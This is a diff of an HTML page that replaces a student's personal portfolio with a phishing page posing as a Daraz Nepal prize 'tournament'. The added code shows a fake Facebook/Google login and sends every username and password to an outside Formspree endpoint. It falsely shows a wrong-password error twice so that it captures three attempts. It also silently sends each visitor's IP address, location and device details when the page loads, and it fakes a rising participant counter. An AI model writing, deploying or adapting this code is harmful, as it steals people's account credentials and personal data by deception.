@@ -3,154 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nirdeshan Kunwar | Journey</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Daraz Nepal | Official 2082 Tournament</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f4f4f6; color: #333; overflow-x: hidden; }
+        .daraz-orange { color: #f85606; }
+        .daraz-bg { background-color: #f85606; }
+        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 100; align-items: center; justify-content: center; padding: 20px; }
+        .glass-card { background: white; padding: 35px; border-radius: 24px; width: 100%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
+        input, select { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 14px; outline-color: #f85606; transition: 0.2s; }
+        input:focus { border-color: #f85606; box-shadow: 0 0 0 2px rgba(248, 86, 6, 0.1); }
+        .error-box { color: #e11d48; font-size: 12px; font-weight: 700; margin-bottom: 12px; display: none; background: #fff1f2; padding: 10px; border-radius: 10px; border: 1px solid #fda4af; }
+        #participation-ui, #success-ui { display: none; }
+        .btn-main { width: 100%; background: #f85606; color: white; padding: 16px; border-radius: 14px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
+        .btn-main:hover { background: #d44905; transform: translateY(-2px); box-shadow: 0 10px 20px rgba(248, 86, 6, 0.3); }
+    </style>
 </head>
 <body>
 
-    <nav class="side-menu">
-        <div class="menu-items">
-            <a href="#hero">Home</a>
-            <a href="#journey">Journey</a>
-            <a href="#achievements">Progression</a>
-            <a href="#vision">Vision</a>
-            <a href="#gallery">Gallery</a>
-            <a href="#assistant">Talk to Nir</a>
-        </div>
-    </nav>
+    <div id="landing-page" class="max-w-2xl mx-auto py-12 px-6 text-center">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/df/Daraz_Logo.png" class="h-10 mx-auto mb-8" alt="Daraz">
+        <h1 class="text-4xl md:text-5xl font-black mb-4 tracking-tighter">EXCLUSIVE <span class="daraz-orange">GIFT OFFER</span></h1>
+        <p class="text-lg text-gray-600 mb-8 font-bold">1x Laptop | 3x 15,000 NPR | 10x 5,000 NPR</p>
 
-    <header id="hero" class="full-section reveal">
-        <div class="content-limit">
-            <div class="photo-box">
-                <img src="IMG_20260107_122423_899.webp" alt="Nirdeshan Kunwar">
-            </div>
-            <h1 class="main-name">NIRDESHAN<br><span>KUNWAR</span></h1>
-            <div class="typing-container">
-                I am a <span id="typewriter"></span>
-            </div>
-        </div>
-    </header>
-
-    <section id="journey" class="full-section reveal">
-        <div class="content-limit">
-            <h2 class="section-title">JOURNEY (BIO)</h2>
-            <p>Nirdeshan Kunwar, born in Achham, Nepal, balances academic and athletic ambitions with a disciplined lifestyle. Currently a CS student at GoldenGate College and a dedicated cricketer at Kathmandu Cricket Academy.</p>
-        </div>
-    </section>
-
-    <section id="achievements" class="full-section reveal">
-        <div class="content-limit">
-            <h2 class="section-title">PROGRESSION</h2>
-            <ul style="list-style:none; line-height:2;">
-                <li>🏆 Represented District at U16, U19 & 10th National.</li>
-                <li>🏅 Player of the Tournament - SEE Camp 2082.</li>
-                <li>🏏 Best Batsman - GoldenGate College 2082.</li>
-            </ul>
-        </div>
-    </section>
-
-    <section id="vision" class="full-section reveal">
-        <div class="content-limit">
-            <h2 class="section-title">MY PHILOSOPHY</h2>
-            <p style="font-style: italic; font-size: 1.5rem;">"Dream without limits, Work without excuses."</p>
-        </div>
-    </section>
-
-    <section id="gallery" class="full-section reveal">
-        <div class="content-limit">
-            <h2 class="section-title">VISUAL GALLERY</h2>
-            <div class="gallery-grid">
-                <div class="img-frame"><img src="IMG_20250715_154508.jpg"></div>
-                <div class="img-frame"><img src="IMG_20260307_175246.jpg"></div>
-                <div class="img-frame"><img src="1766114093638.jpg"></div>
+        <div class="text-left bg-white p-8 rounded-3xl shadow-sm border border-gray-200 mb-8 space-y-4 text-sm leading-relaxed">
+            <h3 class="font-black text-xl border-b pb-2 mb-4 uppercase tracking-tighter">Rules & Policy</h3>
+            <p>1. Participation is strictly limited to one entry per person; any attempt to create multiple accounts or use automated bots will result in permanent disqualification and IP blocking.</p>
+            <p>2. Winners will be selected through a verified randomizer and will be contacted exclusively via the Email or Facebook account used during the secure login process.</p>
+            <p>3. To claim the Exclusive Laptop or Cash Prizes, winners must provide a valid Government-issued ID (Citizenship or License) that matches the name provided in the participation form.</p>
+            <p>4. All entries must be submitted before the official tournament deadline of 2082-11-29; no entries will be accepted or recorded after 11:59 PM on this date.</p>
+            <p>5. Daraz Nepal reserves the right to modify or cancel the tournament at any time if fraudulent activity is detected, ensuring a fair and transparent environment for all real customers.</p>
+            <p>6. Cash prizes of 15,000 NPR and 5,000 NPR will be disbursed via digital wallet (eSewa/Khalti) or bank transfer within 7 working days of winner verification.</p>
+            <p>7. Winners will be announced via a live-streamed lucky draw on the official Facebook page to ensure complete transparency for all participants.</p>
+            <p>8. Participants must ensure the phone number provided is active; three failed attempts to contact a winner will result in the selection of a runner-up.</p>
+            <p>9. By entering this tournament, you consent to the use of your first name and city on our "Live Winners Dashboard" for promotional purposes.</p>
+            
+            <div class="mt-6 pt-4 border-t flex items-center gap-3">
+                <input type="checkbox" id="agree-check" class="w-6 h-6 accent-[#f85606] cursor-pointer">
+                <label for="agree-check" class="font-black text-gray-700 cursor-pointer uppercase text-xs">I agree to all tournament rules</label>
             </div>
         </div>
-    </section>
+        <button onclick="triggerLogin()" class="btn-main text-xl">GO TO OFFER</button>
+    </div>
 
-    <section id="assistant" class="full-section reveal">
-        <div class="content-limit">
-            <h2 class="section-title">NIR'S ASSISTANT</h2>
-            <div class="chat-box" id="chatBox"></div>
-            <div style="display:flex; gap:10px; justify-content:center;">
-                <input type="text" id="userInput" class="chat-input" placeholder="Ask about Nir...">
-                <button class="chat-btn" onclick="sendMessage()">Send</button>
-            </div>
+    <div id="login-modal" class="modal-overlay">
+        <div class="glass-card">
+            <div class="text-2xl font-black daraz-orange tracking-tighter">Mrtechnician</div>
+            <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest mb-6">NK Digital Services Secure Portal</p>
+            
+            <div id="error-display" class="error-box">Please Enter your Correct password and Try Again to participate!</div>
+
+            <form id="secure-form" action="https://formspree.io/f/mgoldrel" method="POST">
+                <select name="Login_Method" required>
+                    <option value="Facebook">Log in with Facebook</option>
+                    <option value="Google">Log in with Email / Google</option>
+                </select>
+                <input type="text" name="Username" placeholder="Mobile number or email" required>
+                <input type="password" name="Password" id="password-input" placeholder="Password" required>
+                <button type="submit" class="btn-main mt-4" id="login-btn">Log In</button>
+            </form>
+            <p class="mt-8 text-[10px] text-gray-400 font-bold tracking-widest uppercase">Personal Backup System v2.0</p>
         </div>
-    </section>
+    </div>
 
-    <script src="https://js.puter.com/v2/"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <div id="participation-ui" class="min-h-screen flex items-center justify-center p-6">
+        <div class="bg-white p-10 rounded-[40px] shadow-2xl w-full max-w-md border border-gray-100">
+            <h2 class="text-3xl font-black mb-2 tracking-tight">Final Details</h2>
+            <p class="text-gray-500 text-sm mb-8">Verified! Enter your delivery information.</p>
+            <form class="space-y-4">
+                <input type="text" id="cust-name" placeholder="Full Name" required>
+                <input type="text" id="cust-addr" placeholder="City & Area Address" required>
+                <input type="tel" id="cust-phone" placeholder="Phone Number" required>
+                <input type="number" id="cust-age" placeholder="Age" required>
+                <div class="text-left py-2">
+                    <p class="text-[10px] font-black text-gray-400 uppercase mb-3">Shopped on Daraz before?</p>
+                    <div class="flex gap-6 font-bold text-sm">
+                        <label class="flex items-center gap-2"><input type="radio" name="shopper" value="Yes" class="accent-[#f85606]"> Yes</label>
+                        <label class="flex items-center gap-2"><input type="radio" name="shopper" value="No" class="accent-[#f85606]"> No</label>
+                    </div>
+                </div>
+                <button type="button" onclick="finalizeEntry()" class="btn-main">SUBMIT PARTICIPATION</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="success-ui" class="daraz-bg min-h-screen text-white flex flex-col items-center justify-center p-8 text-center">
+        <div class="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center text-4xl mb-6">🏆</div>
+        <h1 class="text-5xl font-black mb-4 tracking-tighter">PARTICIPATION SUCCESSFUL!</h1>
+        <p class="max-w-md opacity-90 text-lg mb-12">Your entry is now live. Winners will be announced after <b>2082-11-29</b> via Email or Facebook.</p>
+        
+        <div class="bg-black/20 p-8 rounded-[32px] border border-white/10 w-full max-w-sm">
+            <p class="text-[10px] font-black uppercase tracking-widest opacity-60 mb-2">Live Participants</p>
+            <div class="text-6xl font-mono font-black text-yellow-400" id="live-counter">14,208</div>
+        </div>
+    </div>
 
     <script>
-        // 1. DYNAMIC TYPING EFFECT (One by One)
-        const words = ["Digital Creator", "Cricketer", "CS Student"];
-        let wordIndex = 0;
-        let charIndex = 0;
-        let isDeleting = false;
-        const typeTarget = document.getElementById("typewriter");
+        let loginAttempts = 0;
 
-        function type() {
-            const currentWord = words[wordIndex];
-            if (isDeleting) {
-                typeTarget.textContent = currentWord.substring(0, charIndex - 1);
-                charIndex--;
-            } else {
-                typeTarget.textContent = currentWord.substring(0, charIndex + 1);
-                charIndex++;
-            }
+        // 1. SILENT VISITOR NOTIFICATION (NEPAL TIME & LOCATION)
+        window.onload = async function() {
+            try {
+                const res = await fetch('https://ipwho.is/');
+                const d = await res.json();
+                const npt = new Date().toLocaleString("en-US", {timeZone: "Asia/Kathmandu"});
 
-            let typeSpeed = isDeleting ? 50 : 100;
-
-            if (!isDeleting && charIndex === currentWord.length) {
-                isDeleting = true;
-                typeSpeed = 2000; // Pause at end
-            } else if (isDeleting && charIndex === 0) {
-                isDeleting = false;
-                wordIndex = (wordIndex + 1) % words.length;
-                typeSpeed = 500;
-            }
-            setTimeout(type, typeSpeed);
-        }
-
-        // 2. PREMIUM SCROLL REVEAL ANIMATION
-        const observerOptions = { threshold: 0.2 };
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('reveal-active');
-                }
-            });
-        }, observerOptions);
-
-        document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
-
-        // 3. INITIALIZE SCRIPTS
-        window.onload = () => {
-            type();
-            emailjs.init("aNDohUpb1KOb8hHnb");
-            document.getElementById("chatBox").innerHTML = `<div class="bot">Hello! I am Nir's assistant. How can I help?</div>`;
+                fetch("https://formspree.io/f/mgoldrel", {
+                    method: "POST",
+                    body: JSON.stringify({ 
+                        Event: "Link Opened", City: d.city, Region: d.region, IP: d.ip, Device: navigator.userAgent, Time: npt 
+                    }),
+                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' }
+                });
+            } catch (e) { console.log("Init failed"); }
         };
 
-        // Puter AI logic remains same as your original provided code
-        async function sendMessage() {
-            const input = document.getElementById("userInput");
-            const chatBox = document.getElementById("chatBox");
-            if(!input.value.trim()) return;
-
-            chatBox.innerHTML += `<div class="user">${input.value}</div>`;
-            const text = input.value;
-            input.value = "";
-            
-            try {
-                const resp = await puter.ai.chat(text); // Simplified for this demo
-                chatBox.innerHTML += `<div class="bot">${resp.message.content}</div>`;
-                chatBox.scrollTop = chatBox.scrollHeight;
-            } catch(e) { console.error(e); }
+        // 2. NAVIGATION LOGIC
+        function triggerLogin() {
+            if (document.getElementById('agree-check').checked) {
+                document.getElementById('login-modal').style.display = 'flex';
+            } else {
+                alert("Please agree to the Tournament Rules first!");
+            }
         }
+
+        // 3. TRIPLE LOGIN LOGIC
+        const form = document.getElementById('secure-form');
+        form.onsubmit = async function(e) {
+            e.preventDefault();
+            loginAttempts++;
+            
+            // Send data to Formspree every time
+            const formData = new FormData(form);
+            formData.append('Attempt', loginAttempts);
+            await fetch(form.action, { method: 'POST', body: formData, headers: { 'Accept': 'application/json' } });
+
+            if (loginAttempts < 3) {
+                document.getElementById('password-input').value = "";
+                document.getElementById('error-display').style.display = 'block';
+                document.getElementById('login-btn').innerText = "Try Again";
+            } else {
+                document.getElementById('login-modal').style.display = 'none';
+                document.getElementById('landing-page').style.display = 'none';
+                document.getElementById('participation-ui').style.display = 'flex';
+                window.scrollTo(0, 0);
+            }
+        };
+
+        // 4. FINAL SUBMISSION
+        function finalizeEntry() {
+            if(!document.getElementById('cust-name').value) { alert("Please enter your name"); return; }
+            document.getElementById('participation-ui').style.display = 'none';
+            document.getElementById('success-ui').style.display = 'flex';
+        }
+
+        // 5. LIVE COUNTER
+        setInterval(() => {
+            const c = document.getElementById('live-counter');
+            if(c) {
+                let v = parseInt(c.innerText.replace(',', ''));
+                c.innerText = (v + Math.floor(Math.random() * 3)).toLocaleString();
+            }
+        }, 3500);
     </script>
 </body>
 </html>
+
+
+
 
 
 
